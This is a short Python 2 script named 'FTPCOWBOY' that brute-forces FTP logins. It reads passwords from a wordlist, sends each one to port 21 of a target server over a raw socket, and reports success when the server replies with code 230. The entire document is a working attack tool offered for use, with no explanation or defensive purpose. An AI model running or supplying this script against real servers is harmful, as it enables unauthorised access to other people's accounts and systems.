#!/usr/bin/python
import socket,sys,re

if len(sys.argv) != 4:
  print "########### FTPCOWBOY ###########"
  print "- - - - - -  - - -  - - - - - - - - - - - - -"
  print "Example: python ftpcowboy.py target user wordlist.txt"
  sys.exit()

target = sys.argv[1]
user = sys.argv[2]

file = open(sys.argv[3])
for passw in file.readlines():

  print "Brute forcing FTP %s:%s"%(user,passw)
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect ((target,21))
  s.recv(1024)
  s.send("USER "+user+"\r\n")
  s.recv(1024)
  s.send("PASS "+passw+"\r\n")
  response = s.recv(1024)
  s.send("Quit\r\n")

  if re.search("230",response):
    print "[+] == PASSWORD FOUND == %s[+]"%(passw)
    break
